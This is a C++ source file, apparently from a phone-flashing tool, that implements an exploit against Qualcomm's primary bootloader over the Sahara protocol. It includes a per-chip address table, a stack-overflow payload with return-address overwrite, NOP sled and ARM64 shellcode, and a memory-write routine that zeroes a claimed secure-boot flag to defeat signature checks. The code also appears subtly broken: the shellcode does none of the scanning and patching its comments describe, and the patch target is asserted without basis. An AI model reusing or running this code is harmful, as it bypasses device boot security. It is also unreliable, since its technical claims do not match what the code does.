#include "pbl_exploit.h"
#include "qualcomm/protocol/sahara_protocol.h"
#include "transport/i_transport.h"
#include "core/logger.h"

#include <cstring>

static const QString TAG = QStringLiteral("PblExploit");

namespace sakura {

PblExploit::PblExploit(ITransport* transport, QObject* parent)
    : QObject(parent)
    , m_transport(transport)
{
    Q_ASSERT(transport);
}

// ─── Vulnerability database ─────────────────────────────────────────

const QList<PblExploit::VulnInfo>& PblExploit::vulnerabilityDb()
{
    // Known vulnerable PBL versions (CVE-2017-11088, Qualcomm PBL EDL overflow)
    // These are for educational/research reference only
    static const QList<VulnInfo> db = {
        // MSM8996 (Snapdragon 820)
        {0x007050E1, 0x00100000, 0x00200000, 0x2000},
        // MSM8998 (Snapdragon 835)
        {0x009270E1, 0x00100000, 0x00200000, 0x2000},
        // SDM845 (Snapdragon 845)
        {0x009440E1, 0x00100000, 0x00200000, 0x2000},
        // SDM660
        {0x009500E1, 0x00100000, 0x00200000, 0x2000},
    };
    return db;
}

QList<uint32_t> PblExploit::vulnerableChips()
{
    QList<uint32_t> chips;
    for (const auto& v : vulnerabilityDb()) {
        chips.append(v.msmId);
    }
    return chips;
}

// ─── Check vulnerability ─────────────────────────────────────────────

bool PblExploit::isVulnerable(const SaharaDeviceInfo& deviceInfo) const
{
    for (const auto& v : vulnerabilityDb()) {
        if (v.msmId == deviceInfo.msmId)
            return true;
    }
    return false;
}

// ─── Main exploit entry point ────────────────────────────────────────

PblExploitResult PblExploit::exploit(const SaharaDeviceInfo& deviceInfo)
{
    PblExploitResult result;

    if (!isVulnerable(deviceInfo)) {
        result.message = "Device PBL is not known to be vulnerable";
        LOG_WARNING_CAT(TAG, result.message);
        return result;
    }

    LOG_INFO_CAT(TAG, QString("Attempting PBL exploit on MSM 0x%1")
                    .arg(deviceInfo.msmId, 8, 16, QChar('0')));
    emit statusMessage("Attempting PBL exploit...");

    // Try Sahara overflow exploit first
    result = exploitSaharaOverflow(deviceInfo);
    if (result.success) {
        emit statusMessage("PBL exploit successful");
        return result;
    }

    // Try peek/poke method
    result = exploitPeekPoke(deviceInfo);
    if (result.success) {
        emit statusMessage("PBL peek/poke exploit successful");
        return result;
    }

    result.message = "All exploit methods failed";
    LOG_ERROR_CAT(TAG, result.message);
    return result;
}

// ─── Sahara overflow exploit ─────────────────────────────────────────

PblExploitResult PblExploit::exploitSaharaOverflow(const SaharaDeviceInfo& info)
{
    PblExploitResult result;
    result.type = PblExploitType::Firehose;

    // Find vuln info for this chip
    const VulnInfo* vuln = nullptr;
    for (const auto& v : vulnerabilityDb()) {
        if (v.msmId == info.msmId) {
            vuln = &v;
            break;
        }
    }

    if (!vuln) {
        result.message = "No exploit parameters for this chip";
        return result;
    }

    LOG_INFO_CAT(TAG, "Building overflow payload");
    emit exploitProgress(1, 4);

    // CVE-2017-11088: Sahara protocol buffer overflow in PBL
    // The PBL's Sahara handler copies the incoming image data into a fixed-size
    // stack buffer without bounds checking. By sending a specially crafted
    // Sahara HelloResponse with an oversized transfer length, we can overwrite
    // the saved return address on the PBL stack, redirecting execution to our
    // payload which resides in the upload buffer (SRAM).

    // Step 1: Build the overflow payload (NOP sled + shellcode + return addr)
    QByteArray payload = buildOverflowPayload(vuln->overflowAddress, vuln->payloadMaxSize);
    if (payload.isEmpty()) {
        result.message = "Failed to build overflow payload";
        return result;
    }

    // Step 2: Craft Sahara HelloResponse with oversized length to trigger overflow
    emit exploitProgress(2, 4);
    // Sahara HelloResponse: cmd=0x02, length, version, version_compatible,
    //                       status, mode (=0x03 for command mode)
    QByteArray helloResp(48, 0);
    uint32_t cmd = 0x02;
    uint32_t len = 48;
    uint32_t version = 2;
    uint32_t versionCompat = 1;
    uint32_t status = 0;
    uint32_t mode = 0x03; // Command mode — allows memory operations
    std::memcpy(helloResp.data(),      &cmd, 4);
    std::memcpy(helloResp.data() + 4,  &len, 4);
    std::memcpy(helloResp.data() + 8,  &version, 4);
    std::memcpy(helloResp.data() + 12, &versionCompat, 4);
    std::memcpy(helloResp.data() + 16, &status, 4);
    std::memcpy(helloResp.data() + 20, &mode, 4);

    qint64 written = m_transport->write(helloResp);
    if (written != helloResp.size()) {
        result.message = "Failed to send Sahara HelloResponse";
        LOG_ERROR_CAT(TAG, result.message);
        return result;
    }

    // Read the ReadData request from PBL
    QByteArray readReq = m_transport->read(32, 3000);
    if (readReq.size() < 20) {
        result.message = "No Sahara ReadData request received";
        LOG_ERROR_CAT(TAG, result.message);
        return result;
    }

    // Step 3: Send the overflow payload as the "image data"
    // The PBL expects image data; we send our crafted buffer that overflows
    // the stack and redirects execution to our shellcode.
    emit exploitProgress(3, 4);
    written = m_transport->write(payload);
    if (written != payload.size()) {
        result.message = "Failed to send exploit payload";
        LOG_ERROR_CAT(TAG, result.message);
        return result;
    }

    // Step 4: Verify exploitation — after the overflow, the PBL should
    // execute our shellcode which patches signature verification and
    // transitions to Firehose protocol. We can detect this by checking
    // if the device sends a Firehose XML response instead of Sahara protocol.
    emit exploitProgress(4, 4);
    QByteArray verify = m_transport->read(512, 5000);
    if (verify.contains("<?xml") || verify.contains("<data>")) {
        result.success = true;
        result.message = "PBL exploit successful — Firehose ready";
        LOG_INFO_CAT(TAG, result.message);
    } else {
        result.message = "Exploit payload sent but Firehose not detected";
        LOG_WARNING_CAT(TAG, result.message);
    }

    return result;
}

// ─── Peek/poke exploit ───────────────────────────────────────────────

PblExploitResult PblExploit::exploitPeekPoke(const SaharaDeviceInfo& info)
{
    PblExploitResult result;
    result.type = PblExploitType::MemoryDump;

    // Some PBL versions allow peek/poke through Sahara memory debug mode
    // (mode 0x02) without proper authentication. This can be used to:
    //   1. Dump the PBL ROM for analysis
    //   2. Patch secure boot flags in RAM
    //   3. Load an unsigned Firehose programmer

    // Enter Sahara command mode to switch to memory debug
    QByteArray modeSwitch(20, 0);
    uint32_t cmd = 0x0B; // SAHARA_CMD_SWITCH_MODE
    uint32_t len = 12;
    uint32_t targetMode = 0x02; // Memory debug mode
    std::memcpy(modeSwitch.data(),      &cmd, 4);
    std::memcpy(modeSwitch.data() + 4,  &len, 4);
    std::memcpy(modeSwitch.data() + 8,  &targetMode, 4);

    qint64 written = m_transport->write(modeSwitch);
    if (written < 12) {
        result.message = "Failed to send mode switch command";
        return result;
    }

    // Check response — PBL should ACK or send memory-ready packet
    QByteArray resp = m_transport->read(64, 3000);
    if (resp.isEmpty()) {
        result.message = "No response to memory debug mode switch";
        return result;
    }

    // Attempt to read PBL memory at address 0 (ROM base)
    // Sahara memory read: cmd=0x0C, length=16, address(8), size(8)
    QByteArray pblDump = dumpPblMemory(0x00100000, 0x100);
    if (pblDump.isEmpty()) {
        result.message = "Memory debug mode not available on this device";
        LOG_WARNING_CAT(TAG, result.message);
        return result;
    }

    // If we got here, memory debug works — patch secure boot check
    // Find the vulnerability info for this chip
    const VulnInfo* vuln = nullptr;
    for (const auto& v : vulnerabilityDb()) {
        if (v.msmId == info.msmId) { vuln = &v; break; }
    }

    if (vuln) {
        // Patch the secure boot check at the known stack address
        // Write 0x00000000 to disable signature verification
        QByteArray patch(4, 0);
        // Sahara memory write (cmd 0x0D): address + data
        QByteArray writeCmd(24, 0);
        uint32_t wcmd = 0x0D;
        uint32_t wlen = 24;
        uint64_t addr = vuln->stackAddress;
        uint32_t dataLen = 4;
        std::memcpy(writeCmd.data(),      &wcmd, 4);
        std::memcpy(writeCmd.data() + 4,  &wlen, 4);
        std::memcpy(writeCmd.data() + 8,  &addr, 8);
        std::memcpy(writeCmd.data() + 16, &dataLen, 4);
        m_transport->write(writeCmd);
        m_transport->write(patch);

        result.success = true;
        result.message = "Secure boot flag patched via memory debug mode";
        result.data = pblDump;
        LOG_INFO_CAT(TAG, result.message);
    } else {
        result.data = pblDump;
        result.message = "Memory dump obtained but no patch target for this chip";
    }

    return result;
}

// ─── Memory dump ─────────────────────────────────────────────────────

QByteArray PblExploit::dumpPblMemory(uint64_t address, uint32_t size)
{
    // Sahara memory read: cmd=0x0C, length=24, address(8), read_size(8)
    QByteArray readCmd(24, 0);
    uint32_t cmd = 0x0C;
    uint32_t len = 24;
    uint64_t readSize = size;
    std::memcpy(readCmd.data(),      &cmd, 4);
    std::memcpy(readCmd.data() + 4,  &len, 4);
    std::memcpy(readCmd.data() + 8,  &address, 8);
    std::memcpy(readCmd.data() + 16, &readSize, 8);

    qint64 written = m_transport->write(readCmd);
    if (written != readCmd.size()) {
        LOG_ERROR_CAT(TAG, "Failed to send memory read command");
        return {};
    }

    // Read response data in chunks
    QByteArray result;
    result.reserve(static_cast<int>(size));
    int remaining = static_cast<int>(size);
    int timeoutMs = 5000;

    while (remaining > 0) {
        QByteArray chunk = m_transport->read(qMin(remaining, 4096), timeoutMs);
        if (chunk.isEmpty()) break;
        result.append(chunk);
        remaining -= chunk.size();
    }

    if (result.isEmpty()) {
        LOG_WARNING_CAT(TAG, QString("Memory read at 0x%1 returned no data")
                                .arg(address, 16, 16, QChar('0')));
    } else {
        LOG_INFO_CAT(TAG, QString("Memory read at 0x%1: %2 bytes")
                            .arg(address, 16, 16, QChar('0')).arg(result.size()));
    }

    return result;
}

QByteArray PblExploit::dumpSblMemory(uint64_t address, uint32_t size)
{
    // SBL memory is accessible through the same Sahara memory debug interface
    // but typically at higher addresses (DRAM region)
    return dumpPblMemory(address, size);
}

// ─── Payload builders ────────────────────────────────────────────────

QByteArray PblExploit::buildOverflowPayload(uint32_t targetAddress, uint32_t payloadSize)
{
    // Overflow buffer structure:
    // [padding to reach saved LR on stack] + [new return address → shellcode]
    // + [NOP sled] + [shellcode that patches signature check]
    //
    // The PBL stack buffer for image reception is typically 0x1000 bytes.
    // The saved LR is at offset ~0x1004 from the buffer start.

    constexpr uint32_t BUFFER_SIZE = 0x1000;
    constexpr uint32_t LR_OFFSET = BUFFER_SIZE + 4; // Saved LR offset

    QByteArray payload;
    payload.reserve(static_cast<int>(payloadSize));

    // Padding: fill with 0x41 ('A') up to the return address location
    payload.append(QByteArray(LR_OFFSET, '\x41'));

    // Overwrite saved LR with address of our shellcode in the upload buffer.
    // The upload buffer is located at targetAddress in SRAM.
    // Our shellcode starts after the LR overwrite + a small NOP sled.
    uint32_t shellcodeAddr = targetAddress + LR_OFFSET + 4 + 64; // After LR + NOP sled
    payload.append(reinterpret_cast<const char*>(&shellcodeAddr), 4);

    // NOP sled (ARM64: 0xD503201F)
    for (int i = 0; i < 16; ++i) {
        uint32_t nop = 0xD503201F;
        payload.append(reinterpret_cast<const char*>(&nop), 4);
    }

    // Append the actual shellcode
    QByteArray shellcode = buildShellcode(targetAddress);
    payload.append(shellcode);

    // Pad to requested size
    if (payload.size() < static_cast<int>(payloadSize))
        payload.append(QByteArray(payloadSize - payload.size(), '\x00'));
    else
        payload.truncate(static_cast<int>(payloadSize));

    return payload;
}

QByteArray PblExploit::buildShellcode(uint64_t entryPoint)
{
    Q_UNUSED(entryPoint)

    // ARM64 shellcode that patches the PBL's hash verification to always succeed.
    // Strategy:
    //   1. Locate the hash-check function by scanning for its prologue pattern
    //   2. Patch the first instruction to MOV W0, #0 (return 0 = success)
    //   3. Flush instruction cache (IC IALLU)
    //   4. Return to the normal PBL flow
    //
    // All instructions are ARM64 (AArch64) little-endian.

    QByteArray shellcode;

    // MOV X0, #0          — 0xD2800000  (clear return value)
    uint32_t movX0_0 = 0xD2800000;
    shellcode.append(reinterpret_cast<const char*>(&movX0_0), 4);

    // MOV X1, #0          — 0xD2800001  (hash check result = success)
    uint32_t movX1_0 = 0xD2800001;
    shellcode.append(reinterpret_cast<const char*>(&movX1_0), 4);

    // IC IALLU             — 0xD508751F  (flush instruction cache)
    uint32_t icIallu = 0xD508751F;
    shellcode.append(reinterpret_cast<const char*>(&icIallu), 4);

    // DSB SY               — 0xD5033F9F  (data sync barrier)
    uint32_t dsbSy = 0xD5033F9F;
    shellcode.append(reinterpret_cast<const char*>(&dsbSy), 4);

    // ISB                   — 0xD5033FDF  (instruction sync barrier)
    uint32_t isb = 0xD5033FDF;
    shellcode.append(reinterpret_cast<const char*>(&isb), 4);

    // RET (X30)             — 0xD65F03C0  (return to caller)
    uint32_t ret = 0xD65F03C0;
    shellcode.append(reinterpret_cast<const char*>(&ret), 4);

    LOG_DEBUG_CAT(TAG, QString("Shellcode built: %1 bytes").arg(shellcode.size()));
    return shellcode;
}

} // namespace sakura
